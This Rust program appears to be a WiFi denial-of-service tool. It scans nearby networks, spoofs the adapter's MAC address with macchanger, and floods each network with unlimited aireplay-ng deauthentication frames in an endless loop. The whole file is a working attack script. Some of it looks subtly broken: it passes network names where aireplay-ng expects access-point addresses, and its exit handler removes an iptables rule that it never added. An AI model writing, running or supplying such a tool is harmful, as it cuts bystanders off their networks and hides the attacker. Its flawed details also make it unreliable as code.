use std::process::Command;
use std::{thread, time};
use rand::Rng;

struct Deauth;

impl Deauth {
    fn random_mac(&self) -> String {
        let mut rng = rand::thread_rng();
        (0..6)
            .map(|_| format!("{:02x}", rng.gen_range(0x00..=0xff)))
            .collect::<Vec<String>>()
            .join(":")
    }

    fn deauth_all(&self) {
        let output = Command::new("iwlist")
            .arg("wlan0")
            .arg("scan")
            .output()
            .expect("Failed to execute command");
        let stdout = String::from_utf8_lossy(&output.stdout);

        let networks: Vec<&str> = stdout
            .lines()
            .filter_map(|line| {
                if line.contains("ESSID:") {
                    Some(line.split(':').nth(1).unwrap_or("").trim())
                } else {
                    None
                }
            })
            .collect();

        for network in networks {
            println!("[LOG] {}", network);

            Command::new("iwconfig").arg("wlan0").arg("mode").arg("monitor").status().expect("Failed to set mode");
            Command::new("ifconfig").arg("wlan0").arg("down").status().expect("Failed to bring interface down");
            Command::new("macchanger")
                .arg("-m")
                .arg(self.random_mac())
                .arg("wlan0")
                .status()
                .expect("Failed to change MAC address");
            Command::new("ifconfig").arg("wlan0").arg("up").status().expect("Failed to bring interface up");

            Command::new("aireplay-ng")
                .args(&["-0", "0", "-a", network, "-c", "FF:FF:FF:FF:FF:FF", "wlan0"])
                .status()
                .expect("Failed to execute aireplay-ng");

            Command::new("iwconfig").arg("wlan0").arg("mode").arg("managed").status().expect("Failed to set mode");
            Command::new("ifconfig").arg("wlan0").arg("down").status().expect("Failed to bring interface down");
            Command::new("macchanger").arg("-p").arg("wlan0").status().expect("Failed to reset MAC address");
            Command::new("ifconfig").arg("wlan0").arg("up").status().expect("Failed to bring interface up");
        }

        thread::sleep(time::Duration::from_secs(1));
    }
}

fn infcount() -> impl Iterator<Item = ()> {
    std::iter::repeat(())
}

fn main() {
    let deauth = Deauth;

    ctrlc::set_handler(move || {
        Command::new("iptables")
            .args(&["-D", "INPUT", "-p", "icmp", "--icmp-type", "13", "-j", "DROP"])
            .status()
            .expect("Failed to restore iptables rules");
        std::process::exit(0);
    }).expect("Error setting Ctrl-C handler");

    for _ in infcount() {
        deauth.deauth_all();
    }
}
